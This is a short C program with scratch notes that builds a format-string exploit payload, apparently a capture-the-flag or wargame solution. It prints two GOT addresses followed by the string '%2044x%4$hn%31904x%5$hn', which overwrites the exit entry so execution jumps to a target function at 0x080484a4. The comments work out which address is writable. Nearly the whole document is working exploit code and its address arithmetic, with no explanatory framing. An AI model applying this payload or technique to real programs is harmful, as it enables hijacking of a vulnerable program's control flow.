#include <stdio.h>

int main ()
{
    char *str = "%2044x%4$hn%31904x%5$hn";

    printf("\x3a\x98\x04\x08\x38\x98\x04\x08%s", str);
}
//2052


//0x080483d0      jmp dword [exit]   ; 0x8049838 (in exit fct) can be modified
0x08049838
\x3a\x98\x04\x08\x38\x98\x04\x08


//Exit addr CAN'T be modified
0x80483d0
\xd2\x83\x04\x08\xd0\x83\x04\x08

//Goal -> o addr
0x080484a4

